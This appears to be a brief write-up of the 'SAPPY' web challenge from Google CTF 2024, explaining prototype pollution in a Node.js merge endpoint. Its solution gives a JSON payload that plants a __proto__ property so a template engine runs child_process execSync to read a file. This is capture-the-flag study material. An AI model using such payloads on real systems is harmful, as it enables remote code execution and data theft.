---
layout: page
title: "SAPPY - Google CTF 2024 Writeup"
subtitle: "Prototype pollution in a Node.js JSON merge function allows injecting arbitrary properties into Object.prototype, which then gets picked up by a template engine executing as admin."
permalink: /ctf/writeups/challenges/web/sappy/
category: "web"
challenge_name: "SAPPY"
difficulty: "Medium"
event: "Google CTF 2024"
points: "267"
solves: "54"
date: 2026-06-26
---

## 🚩 Challenge Overview
* **Platform/Event**: Google CTF 2024
* **Difficulty**: Medium
* **Points**: 267
* **Solves**: 54
* **Category**: Web
* **Tags**: Prototype Pollution, Node.js, Template Engine RCE

---

## 📝 Description
Prototype pollution in a Node.js JSON merge function allows injecting arbitrary properties into Object.prototype, which then gets picked up by a template engine executing as admin.

---

## 💡 Solution / Approach
```python
# Payload in the merge body:
POST /api/merge HTTP/1.1
Content-Type: application/json

{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('cat /flag').toString()"}}}
```
